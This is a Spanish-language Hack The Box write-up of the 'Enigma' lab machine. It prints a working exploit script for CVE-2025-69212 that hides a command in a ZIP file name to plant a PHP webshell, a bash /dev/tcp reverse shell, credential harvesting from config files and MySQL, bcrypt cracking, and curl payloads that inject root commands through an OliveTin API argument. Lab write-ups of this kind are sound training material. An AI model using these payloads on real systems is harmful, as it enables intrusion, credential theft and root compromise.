---
title: "Enigma - Hack The Box"
date: 2026-07-03
unlock_date: 2026-11-21
draft: false
slug: "htb-writeup-enigma"
excerpt: "Esta es una máquina algo complicada. Después de analizar los escaneos, nos dirigimos a una página web activa, pero al no encontrar nada, decidimos revisar si el servicio NFS tenía algún archivo compartido, siendo así que encontramos un PDF que nos da un dominio y unas credenciales con las que nos podemos autenticar. Este dominio resulta ser una página de correos, donde encontramos otro usuario al que le aplicamos password spraying y resulta tener la misma contraseña que el usuario anterior. En los correos de este segundo usuario, encontraremos un correo con un nuevo dominio que incluye sus credenciales de acceso, que resulta ser el software OpenSTAManager. Navegando en este software, encontramos que utiliza un plugin vulnerable llamado P7M el cual tiene el exploit CVE-2025-69212, que nos permite aplicar inyección de comandos, siendo la forma en la que logramos ganar acceso a la máquina víctima. Aplicando enumeración de la máquina víctima, encontramos un archivo de configuración del software OpenSTAManager que contiene las credenciales del servicio MySQL. En MySQL encontramos la contraseña de un usuario de la máquina víctima que logramos crackear, logrando autenticarnos con este nuevo usuario y siendo la forma en la que obtenemos la primer flag. Enumerando lo que puede hacer este usuario, descubrimos que utiliza OliveTin, pero igual encontramos que ejecuta un script que realiza un backup de la base de datos de la máquina y vemos que su configuración permite que se ejecute por cualquier usuario, siendo un servicio que lo ejecuta el Root. Realizamos una inyección de comandos al momento de mandar a llamar un endpoint de la API de OliveTin cuando intentamos ejecutar ese script de backup, lo que nos permite escalar privilegios y convertirnos en Root."
categories: ["HackTheBox", "Easy Machine"]
tags: ["Linux", "NFS", "SSH", "MySQL", "OliveTin", "WebMail", "Password Spraying", "OpenSTAManager", "CVE-2025-69212", "MySQL Enumeration", "Cracking Hash", "Cracking Bcrypt Hash", "Abusing OliveTin Bad Configuration", "Privesc - Abusing OliveTin Bad Configuration", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "echo"
  - "wappalizer"
  - "showmount"
  - "mkdir"
  - "mount"
  - "nc"
  - "bash"
  - "mysql"
  - "JohnTheRipper"
  - "netexec"
  - "su"
  - "ss"
  - "grep"
  - "find"
  - "curl"
links:
  - "https://github.com/advisories/GHSA-25fp-8w8p-mx36"
  - "https://github.com/b0ySie7e/OpenSTAManager-RCE-Exploit-CVE-2026-38751"
  - "https://sploitus.com/exploit?id=46CC1A3B-E288-5D6F-BB8A-C0B2ECAF3AD9"
  - "https://github.com/jonathan-corbin/CVE-2025-69212-Authenticated-RCE-PoC"
  - "https://github.com/lukasz-rybak/CVE-2025-69212"
  - "https://sploitus.com/exploit?id=BF7DCB0D-BCFB-51E5-B8DF-4705A1E07674"
  - "https://github.com/OliveTin/OliveTin/blob/main/config.yaml"
  - "https://docs.olivetin.app/api/intro.html"
  - "https://docs.olivetin.app/api/swagger/"
  - "https://github.com/m2sousa/CVE-2025-69212/blob/master/exploit.py"
showtoc: true
header:
  teaser: "/assets/images/htb-writeup-enigma/enigma.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 10.129.22.231
PING 10.129.22.231 (10.129.22.231) 56(84) bytes of data.
64 bytes from 10.129.22.231: icmp_seq=1 ttl=63 time=66.5 ms
64 bytes from 10.129.22.231: icmp_seq=2 ttl=63 time=67.1 ms
64 bytes from 10.129.22.231: icmp_seq=3 ttl=63 time=67.3 ms
64 bytes from 10.129.22.231: icmp_seq=4 ttl=63 time=74.3 ms

--- 10.129.22.231 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3003ms
rtt min/avg/max/mdev = 66.454/68.799/74.322/3.203 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.22.231 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-03 18:34 -0600
Initiating SYN Stealth Scan at 18:34
Scanning 10.129.22.231 [65535 ports]
Discovered open port 995/tcp on 10.129.22.231
Discovered open port 143/tcp on 10.129.22.231
Discovered open port 80/tcp on 10.129.22.231
Discovered open port 22/tcp on 10.129.22.231
Discovered open port 110/tcp on 10.129.22.231
Discovered open port 993/tcp on 10.129.22.231
Discovered open port 111/tcp on 10.129.22.231
Discovered open port 2049/tcp on 10.129.22.231
Discovered open port 57881/tcp on 10.129.22.231
Discovered open port 54497/tcp on 10.129.22.231
Discovered open port 37711/tcp on 10.129.22.231
Discovered open port 41001/tcp on 10.129.22.231
Completed SYN Stealth Scan at 18:35, 29.61s elapsed (65535 total ports)
Nmap scan report for 10.129.22.231
Host is up, received user-set (0.16s latency).
Scanned at 2026-07-03 18:34:42 CST for 30s
Not shown: 57802 closed tcp ports (reset), 7721 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack ttl 63
80/tcp    open  http    syn-ack ttl 63
110/tcp   open  pop3    syn-ack ttl 63
111/tcp   open  rpcbind syn-ack ttl 63
143/tcp   open  imap    syn-ack ttl 63
993/tcp   open  imaps   syn-ack ttl 63
995/tcp   open  pop3s   syn-ack ttl 63
2049/tcp  open  nfs     syn-ack ttl 63
37711/tcp open  unknown syn-ack ttl 63
41001/tcp open  unknown syn-ack ttl 63
54497/tcp open  unknown syn-ack ttl 63
57881/tcp open  unknown syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 29.69 seconds
           Raw packets sent: 145223 (6.390MB) | Rcvd: 58313 (2.333MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envío de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución DNS para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Vemos que hay bastantes puertos abiertos, pero me llama la atención ver **POP3** y **NFS**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 22,80,110,111,143,993,995,2049,37711,41001,54497,57881 10.129.22.231 -oN targeted
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-03 18:38 -0600
Nmap scan report for enigma.htb (10.129.22.231)
Host is up (0.068s latency).

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp    open  http     nginx 1.24.0 (Ubuntu)

|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Enigma Corp \xE2\x80\x94 Managed IT Solutions
110/tcp   open  pop3     Dovecot pop3d

|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: SASL TOP STLS AUTH-RESP-CODE CAPA RESP-CODES UIDL PIPELINING
| ssl-cert: Subject: commonName=enigma
| Subject Alternative Name: DNS:enigma
| Not valid before: 2026-02-18T20:33:33
|_Not valid after:  2036-02-16T20:33:33
111/tcp   open  rpcbind  2-4 (RPC #100000)

| rpcinfo: 
|   program version    port/proto  service
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      41001/tcp   mountd
|   100005  1,2,3      42439/tcp6  mountd
|   100005  1,2,3      57065/udp   mountd
|   100005  1,2,3      57563/udp6  mountd
|   100021  1,3,4      37711/tcp   nlockmgr
|   100021  1,3,4      46219/tcp6  nlockmgr
|   100021  1,3,4      48077/udp6  nlockmgr
|_  100021  1,3,4      52283/udp   nlockmgr
143/tcp   open  imap     Dovecot imapd (Ubuntu)

|_imap-capabilities: LOGINDISABLEDA0001 OK more post-login listed Pre-login capabilities LOGIN-REFERRALS ENABLE SASL-IR have IDLE LITERAL+ STARTTLS IMAP4rev1 ID
| ssl-cert: Subject: commonName=enigma
| Subject Alternative Name: DNS:enigma
| Not valid before: 2026-02-18T20:33:33
|_Not valid after:  2036-02-16T20:33:33
|_ssl-date: TLS randomness does not represent time
993/tcp   open  ssl/imap Dovecot imapd (Ubuntu)

|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: OK more capabilities post-login Pre-login listed LOGIN-REFERRALS ENABLE SASL-IR have IDLE AUTH=PLAINA0001 IMAP4rev1 ID LITERAL+
| ssl-cert: Subject: commonName=enigma
| Subject Alternative Name: DNS:enigma
| Not valid before: 2026-02-18T20:33:33
|_Not valid after:  2036-02-16T20:33:33
995/tcp   open  ssl/pop3 Dovecot pop3d

|_pop3-capabilities: SASL(PLAIN) TOP USER AUTH-RESP-CODE CAPA RESP-CODES UIDL PIPELINING
| ssl-cert: Subject: commonName=enigma
| Subject Alternative Name: DNS:enigma
| Not valid before: 2026-02-18T20:33:33
|_Not valid after:  2036-02-16T20:33:33
|_ssl-date: TLS randomness does not represent time
2049/tcp  open  nfs      3-4 (RPC #100003)
37711/tcp open  nlockmgr 1-4 (RPC #100021)
41001/tcp open  mountd   1-3 (RPC #100005)
54497/tcp open  mountd   1-3 (RPC #100005)
57881/tcp open  status   1 (RPC #100024)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.91 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

De entre todos los puertos, nos enfocaremos principalmente en el **puerto 80**, que muestra una página web activa, y en el **puerto 2049**, que muestra el servicio **NFS** activo.

Además, vemos que la página web nos redirige a un dominio, así que vamos a registrarlo en el `/etc/hosts`:
```bash
echo "10.129.22.231 enigma.htb" >> /etc/hosts
```
Empecemos por esa página.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/htb-writeup-enigma/Captura1.png">
</p>

Parece ser una página dedicada a servicios de IT.

Veamos qué nos dice **Wappalyzer**:

<p align="center">
<img src="/assets/images/htb-writeup-enigma/Captura2.png">
</p>

No hay mucho que destacar.

Revisando qué más podíamos realizar, no pudimos encontrar algo que nos ayude. Ni siquiera aplicando **Fuzzing**, parece solo ser una página de muestra y no hay algo más.

Es todo lo que podremos hacer en la página web, así que vayamos a analizar el servicio **NFS**.

### Enumeración de Servicio NFS {#NFS}

Utilicemos la herramienta **showmount** para verificar y listar cualquier archivo que esté montado en el servicio **NFS**:
```bash
showmount -e 10.129.22.231
Export list for 10.129.22.231:
/srv/nfs/onboarding *
```
Parece que sí existe una montura activa del servicio **NFS**.

Podemos crear un directorio para poder descargar todos los archivos, haciendo una montura con la herramienta **mount**:
```bash
mkdir /mnt/nfs
                                                                                                                                                                                              
mount -t nfs 10.129.22.231:/srv/nfs/onboarding /mnt/nfs
```

Observemos qué había en ese servicio:
```bash
ls -la /mnt/nfs
total 12
drwxr-xr-x 2 root root 4096 feb 19 13:54 .
drwxr-xr-x 3 root root 4096 jul  3 18:41 ..
-rw-r--r-- 1 root root 1751 feb 19 13:53 New_Employee_Access.pdf
```

Solamente hay un archivo **PDF**, leámoslo:

<p align="center">
<img src="/assets/images/htb-writeup-enigma/Captura3.png">
</p>

Excelente, nos está mostrando un subdominio que parece ser una página de correos, y también tenemos un usuario y contraseña que tendremos que usar para autenticarnos.

Guarda el subdominio en el `/etc/hosts` y veamos qué encontramos en esa página.

#### Analizando Página de Correos (Webmail) e Identificando Password Reuse {#Webmail}

Entremos:

<p align="center">
<img src="/assets/images/htb-writeup-enigma/Captura4.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-enigma/Captura5.png">
</p>

Vemos que hay un correo que nos da instrucciones sobre el onboarding que tendremos por ser aceptados en **Enigma Corp**.

Pero al buscar algo más que podamos usar, no encontraremos nada.

Sin embargo, recordando la advertencia de que debemos cambiar la contraseña que se nos dio, quizá el **usuario Sarah** tampoco siguió esta instrucción.

Y al probarlo, logramos entrar con su usuario al webmail:

<p align="center">
<img src="/assets/images/htb-writeup-enigma/Captura6.png">
</p>

Excelente, tenemos otro subdominio donde se está utilizando **OpenSTAManager** y además, tenemos un acceso como usuario administrador.

Registra ese subdominio en el `/etc/hosts` y entremos ahí.

### Enumeración de Software de Gestión OpenSTAManager {#OpenSTAManager}

Antes que nada, ¿qué es **OpenSTAManager**?

| **Software de Gestión OpenSTAManager** |
|:--------------------------------------:|
| *OpenSTAManager es un software de gestión empresarial de código abierto (open source). Está diseñado para centralizar y automatizar los servicios de asistencia técnica, gestión de inventario y facturación, siendo una solución muy popular para pequeñas y medianas empresas.* |

Ahora sí entremos:

<p align="center">
<img src="/assets/images/htb-writeup-enigma/Captura7.png">
</p>

Si revisamos el perfil (y de hecho en cualquier página), podemos ver la versión que se está utilizando del **OpenSTAManager**:

<p align="center">
<img src="/assets/images/htb-writeup-enigma/Captura8.png">
</p>

Revisando las herramientas y demás páginas, veremos algunas que permiten la subida de archivos **ZIP**, lo que quizá nos permita poder cargar una WebShell de **PHP**:

<p align="center">
<img src="/assets/images/htb-writeup-enigma/Captura9.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-enigma/Captura10.png">
</p>

También busquemos algún Exploit relacionado con la versión.

## Explotación de Vulnerabilidades {#Explotacion}

### Probando Exploit: OS Command Injection in P7M File Processing - CVE-2025-69212 {#Exploit}

La versión del **OpenSTAManager** parece ser vulnerable a **Command Injection (CVE-2025-69212)** al utilizar el plugin **P7M**, que podemos encontrar cómo aplicarlo en el siguiente repositorio:
* <a href="https://github.com/advisories/GHSA-25fp-8w8p-mx36" target="_blank">OpenSTAManager has an OS Command Injection in P7M File Processing</a>

Para aplicarlo, primero tenemos que generar un archivo **ZIP** que contendrá las instrucciones para crear una WebShell de **PHP**, siendo que lo podemos hacer de la siguiente forma:
```bash
cat exploit.py
import zipfile

cmd = "cd files && echo '<?php system($_GET[\"c\"]); ?>' > SHELL.php"
malicious_filename = f'invoice.p7m";{cmd};echo ".p7m'

with zipfile.ZipFile('exploit.zip', 'w') as zf:
    zf.writestr(malicious_filename, b"DUMMY_P7M_CONTENT")

print("[+] exploit.zip created successfully! [+]")

------

python3 exploit.py
[+] exploit.zip created successfully! [+]
```

Ahora, vamos a subir este archivo ZIP a la siguiente ruta: `Sales -> Sales invoices -> Importazione FE`

<p align="center">
<img src="/assets/images/htb-writeup-enigma/Captura11.png">
</p>

Y al mandarlo, observa cómo se carga nuestro archivo:

<p align="center">
<img src="/assets/images/htb-writeup-enigma/Captura12.png">
</p>

Una vez que se carga, obtendremos el siguiente error:

<p align="center">
<img src="/assets/images/htb-writeup-enigma/Captura13.png">
</p>

Pero si probamos la WebShell en la siguiente ruta `http://support_001.enigma.htb/files/SHELL.php?c=id` veremos que funciona:

<p align="center">
<img src="/assets/images/htb-writeup-enigma/Captura14.png">
</p>

Mandémonos una **Reverse Shell**, pero primero alcemos un listener con **netcat**:
```bash
nc -nlvp 443
listening on [any] 443 ...
```

Utiliza la siguiente **Reverse Shell**:
```bash
bash -c 'bash -i >%26 /dev/tcp/Tu_IP/443 0>%261'
```

Observa la **netcat**:
```bash
nc -nlvp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [10.129.22.231] 46840
bash: cannot set terminal process group (1501): Inappropriate ioctl for device
bash: no job control in this shell
www-data@enigma:~/html/openstamanager/files$ whoami
whoami
www-data
```

Obtengamos una sesión interactiva:
```bash
# Paso 1:
script /dev/null -c bash

# Paso 2:
CTRL + Z

# Paso 3:
stty raw -echo; fg

# Paso 4:
reset -> xterm

# Paso 5:
export TERM=xterm && export SHELL=bash && stty rows 51 columns 189
```
Continuemos.

### Enumeración Interna y Enumeración del Servicio MySQL {#EnumInterno}

Leyendo varios archivos encontrados en el sistema, encontramos uno que contiene el usuario, contraseña del **servicio MySQL** y el nombre de la BD utilizada:
```bash
www-data@enigma:~/html/openstamanager$ cat config.inc.php
<?php
...
...
...
// Impostazioni di base per l'accesso al database
$db_host = 'localhost';
$db_username = 'brollin';
$db_password = 'Fri3nds@9099';
$db_name = 'openstamanager';
// $port = '|port|';
$db_options = [
    // 'sort_buffer_size' => '2M',
];
...
```

Comprobemos si tenemos activo el comando **mysql**:
```bash
www-data@enigma:~/html/openstamanager$ which mysql
/usr/bin/mysql
```
Lo tenemos.

Utilicemos esas credenciales para entrar en el **servicio MySQL**:
```bash
www-data@enigma:~/html/openstamanager$ mysql -h localhost -u 'brollin' -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 423
Server version: 8.0.46-0ubuntu0.24.04.3 (Ubuntu)

Copyright (c) 2000, 2026, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```

Veamos qué bases de datos existen:
```bash
mysql> show databases;
+--------------------+

| Database           |
+--------------------+

| information_schema |
| openstamanager     |
| performance_schema |
+--------------------+
3 rows in set (0.00 sec)
```

Bien, utilicemos la BD **openstamanager** para ver qué tablas tiene:
```bash
mysql> use openstamanager
1 rows in set (0.00 sec)

mysql> show tables;
+---------------------------------+

| Tables_in_openstamanager        |
+---------------------------------+

| an_anagrafiche                  |
| an_anagrafiche_agenti           |
| an_assicurazione_crediti        |
| an_mansioni                     |
...
...

| zz_tokens                       |
| zz_user_sedi                    |
| zz_users                        |
| zz_views                        |
| zz_views_lang                   |
| zz_widgets                      |
| zz_widgets_lang                 |
+---------------------------------+
221 rows in set (0.00 sec)
```
Existen bastantes tablas, pero me llama la atención la tabla **zz_users**.

Veamos su contenido:
```bash
mysql> select * from zz_users;
+----+----------+--------------------------------------------------------------+------------------+--------------+----------+---------+---------------------+---------------------+-------------+---------------+---------+

| id | username | password                                                     | email            | idanagrafica | idgruppo | enabled | created_at          | updated_at          | reset_token | image_file_id | options |
+----+----------+--------------------------------------------------------------+------------------+--------------+----------+---------+---------------------+---------------------+-------------+---------------+---------+

|  1 | admin    | $2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu | admin@enigma.htb |            1 |        1 |       1 | 2026-02-18 19:26:52 | 2026-02-18 19:26:52 | NULL        |          NULL |         |
|  2 | haris    | $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC | haris@enigma.htb |            1 |        5 |       1 | 2026-02-18 20:58:28 | 2026-05-26 11:07:03 | NULL        |          NULL |         |
+----+----------+--------------------------------------------------------------+------------------+--------------+----------+---------+---------------------+---------------------+-------------+---------------+---------+
2 rows in set (0.00 sec)
```
Tenemos un par de usuarios y contraseñas, así que intentemos crackearlos.

#### Crackeando Contraseña Cifrada y Ganando Acceso como Usuario Haris {#CrackingHash}

Guarda el hash completo del **usuario Haris** en un archivo y utilizaremos la herramienta **John The Ripper** para crackearlo:
```bash
john -w:/usr/share/wordlists/rockyou.txt hashHaris
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bestfriends      (?)     
1g 0:00:00:03 DONE (2026-07-11 02:39) 0.2680g/s 188.2p/s 188.2c/s 188.2C/s gloria..maldita
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Bien, tenemos la contraseña.

Probemos si funciona con **netexec**:
```bash
nxc ssh 10.129.26.229 -u 'haris' -p 'bestfriends'
SSH         10.129.26.229   22     10.129.26.229    [*] SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.16
SSH         10.129.26.229   22     10.129.26.229    [-] haris:bestfriends
```
Parece que no es correcta.

Antes de descartarla y, ya que tenemos una sesión activa, vamos a usarla para autenticarnos como este usuario:
```bash
www-data@enigma:~/html/openstamanager$ su haris
Password: 
haris@enigma:/var/www/html/openstamanager$ whoami
haris
```
Sí funcionó, pero con la sesión activa, mas no funciona desde fuera.

En su directorio, encontraremos la flag del usuario:
```bash
haris@enigma:/var/www/html/openstamanager$ cd /home/haris/
haris@enigma:~$ ls
mail  user.txt
haris@enigma:~$ cat user.txt
...
```

## Post Explotación {#Post}

### Escalando Privilegios Abusando de Mala Configuración de OliveTin (authRequireGuestsToLogin=false) {#OliveTinPrivesc}

Revisando el directorio `/opt`, veremos que hay 2 directorios, pero hay uno de estos que nos interesa, que es el de **OliveTin**:
```bash
haris@enigma:~$ ls -la /opt
total 16
drwxr-xr-x  3 root root 4096 Jun 23 14:14 .
drwxr-xr-x 23 root root 4096 Jun 23 14:14 ..
drwxr-xr-x  3 root root 4096 Jun 23 14:14 OliveTin
-rw-r--r--  1 root root  436 May 26 10:51 roundcube
```

Podemos revisar su contenido y veremos algunos archivos interesantes que podemos leer:
```bash
haris@enigma:~$ ls -la /opt/OliveTin/OliveTin-linux-amd64/
total 14644
drwxr-xr-x  4 root  root      4096 Jun 23 14:14 .
drwxr-xr-x  3 root  root      4096 Jun 23 14:14 ..
-rw-r--r--  1 kevin kevin    13681 Feb 14 20:41 config.yaml
-rw-r--r--  1 kevin kevin     1307 Feb 14 20:41 Dockerfile
-rw-r--r--  1 kevin kevin    34523 Feb 14 20:41 LICENSE
-rwxr-xr-x  1 kevin kevin 14905528 Feb 14 20:46 OliveTin
-rw-r--r--  1 kevin kevin     5249 Feb 14 20:41 README.md
drwxr-xr-x 10 root  root      4096 Jun 23 14:14 var
drwxr-xr-x  3 root  root      4096 Jun 23 14:14 webui
```

Podemos encontrar el repositorio de esta herramienta al revisar el archivo **README.md**:
```bash
haris@enigma:~$ cat /opt/OliveTin/OliveTin-linux-amd64/README.md
<div align = "center">
  <img alt = "project logo" src = "https://github.com/OliveTin/OliveTin/blob/main/frontend/OliveTinLogo.png" width = "128" />
  <h1>OliveTin</h1>
...
...
```

Investiguemos qué hace esta herramienta:

| **OliveTin** |
|:------------:|
| *OliveTin es una aplicación web de código abierto que transforma comandos de consola complejos en botones interactivos fáciles de usar, permitiendo que cualquier persona ejecute tareas técnicas y automatizaciones en un servidor con un solo clic sin necesidad de saber usar la terminal o tener acceso SSH directo.* |

<br>

Me da la impresión de que podremos crear un botón interactivo que nos ayude a escalar privilegios.

Para la ejecución de los comandos, se utiliza una **API** que podemos ver el **Swagger** en el siguiente link:
* <a href="https://docs.olivetin.app/api/swagger/" target="_blank">OliveTin 2k API</a>

Un par de estos endpoints son los más interesantes, pues son los que permiten ejecutar lo que el botón haga, los cuales son:
* `/olivetin.api.v1.OliveTinApiService/StartAction`
* `/olivetin.api.v1.OliveTinApiService/StartActionAndWait`

Esta información nos será útil para más adelante.

Si revisamos el archivo **config.yaml**, encontraremos qué URL está desplegado:
```bash
haris@enigma:~$ cat /opt/OliveTin/OliveTin-linux-amd64/config.yaml 

# Listen on all addresses available, port 1337
listenAddressSingleHTTPFrontend: 0.0.0.0:1337
```

Podemos comprobar que está activo en la máquina con el comando **ss**:
```bash
haris@enigma:~$ ss -tulnp | grep 1337
tcp   LISTEN 0      4096       127.0.0.1:1337       0.0.0.0:*
```

Además, durante la investigación por internet, encontraremos que al instalar esta herramienta, su contenido se guarda en la ruta `/etc/OliveTin/` o `/var/var/oliveTin/`, así que podemos averiguarlo con el comando find: 
```bash
haris@enigma:/opt/OliveTin/OliveTin-linux-amd64$ find / -type d -name "*OliveTin*" 2>/dev/null
/sys/fs/cgroup/system.slice/OliveTin.service
/etc/OliveTin
/opt/OliveTin
/opt/OliveTin/OliveTin-linux-amd64
```

Revisando su contenido, solo podremos encontrar otro archivo **config.yaml**, pues dentro de ese directorio no hay nada:
```bash
haris@enigma:/etc/OliveTin$ ls -la
total 36
drwxr-xr-x   3 root root  4096 Jun 23 14:14 .
drwxr-xr-x 132 root root 12288 Jun 23 14:14 ..
-rw-r--r--   1 root root 14158 Mar  4  2026 config.yaml
drwxr-xr-x   3 root root  4096 Jun 23 14:14 custom-webui
```

Analizando su contenido, encontraremos que este fue modificado para agregar un botón que ejecuta un comando con **mysqldump** para crear un backup de la BD:
```bash
# Docs: https://docs.olivetin.app/entities/intro.html
  - title: Backup Database
    id: backup_database
    icon: "⛁"
    shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"
    popupOnStart: execution-dialog
    arguments:
      - name: db_user
        type: ascii_identifier
        default: backup_svc
      - name: db_pass
        type: password
      - name: db_name
        type: ascii_identifier
        default: production
```

Pero también encontramos que no se necesita ninguna autenticación para ocupar **OliveTin**:
```
# Security - Authentication

# This setting effectively enables or disables guests. 
# If set to "true", then users will have to login to do anything.
authRequireGuestsToLogin: false
```
Con esto ya descubierto, podemos buscar una forma para poder inyectar un comando que nos permita escalar privilegios, pues estas acciones del backup, solamente las puede ejecutar el **Root**.

Gracias a **Claude**, podemos probar una forma de inyectar comandos dentro de la data que se envía hacia la API para ejecutar el script que hace el backup, esto haciéndolo con el comando curl y utilizando cualquiera de los 2 endpoints que mencioné sobre la API:
```bash
haris@enigma:~$ curl -s -X POST -H "Content-Type: application/json" -d '{"actionId":"backup_database","arguments":[{"name":"db_user","value":"backup_svc"},{"name":"db_pass","value":"x'\'' ; id ; #"},{"name":"db_name","value":"production"}]}' http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartActionAndWait
{"logEntry":{"datetimeStarted":"2026-07-11 09:03:37", "actionTitle":"Backup Database", "output":"mysqldump: [Warning] Using a password on the command line interface can be insecure.\nUsage: mysqldump [OPTIONS] database [tables]\nOR     mysqldump [OPTIONS] --databases [OPTIONS] DB1 [DB2 DB3...]\nOR     mysqldump [OPTIONS] --all-databases [OPTIONS]\nFor more options, use mysqldump --help\nuid=0(root) gid=0(root) groups=0(root)\n", "timedOut":false, "exitCode":0, "user":"guest", "userClass":"", "actionIcon":"⛁", "tags":[], "executionTrackingId":"633635e7-4bff-4e22-aa37-d039df293180", "datetimeFinished":"2026-07-11 09:03:37", "executionStarted":true, "executionFinished":true, "blocked":false, "datetimeIndex":"2", "canKill":false, "datetimeRateLimitExpires":"", "bindingId":"backup_database"}}
```
Funcionó, se pudo ejecutar nuestro comando y confirmamos que quien ejecuta este script es el **Root**.

Se me ocurre que cambiemos los permisos de la **Bash**, así que veamos primero qué permisos tiene:
```bash
haris@enigma:~$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

Ahora, vamos a darle permisos **SUID** para que cualquier usuario pueda ejecutarla con máximos privilegios:
```bash
haris@enigma:~$ curl -s -X POST -H "Content-Type: application/json" -d '{"actionId":"backup_database","arguments":[{"name":"db_user","value":"backup_svc"},{"name":"db_pass","value":"x'\'' ; chmod u+s /bin/bash ; #"},{"name":"db_name","value":"production"}]}' http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartActionAndWait
{"logEntry":{"datetimeStarted":"2026-07-11 09:04:31", "actionTitle":"Backup Database", "output":"mysqldump: [Warning] Using a password on the command line interface can be insecure.\nUsage: mysqldump [OPTIONS] database [tables]\nOR     mysqldump [OPTIONS] --databases [OPTIONS] DB1 [DB2 DB3...]\nOR     mysqldump [OPTIONS] --all-databases [OPTIONS]\nFor more options, use mysqldump --help\n", "timedOut":false, "exitCode":0, "user":"guest", "userClass":"", "actionIcon":"⛁", "tags":[], "executionTrackingId":"c71bd6a3-2ea8-4259-9b5f-2dd512cb8d27", "datetimeFinished":"2026-07-11 09:04:31", "executionStarted":true, "executionFinished":true, "blocked":false, "datetimeIndex":"3", "canKill":false, "datetimeRateLimitExpires":"", "bindingId":"backup_database"}}
```

Revisamos de nuevo los permisos de la **Bash**:
```bash
haris@enigma:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```
Y vemos que ya puede ser utilizada por cualquiera.

Utiliza la **Bash** de forma privilegiada
```bash
haris@enigma:~$ bash -p
bash-5.2# whoami
root
```
Somos **Root**.

Ya solo busquemos la última flag:
```bash
bash-5.2# cd /root
bash-5.2# ls
root.txt
bash-5.2# cat root.txt
...
```
Y con esto terminamos la máquina.
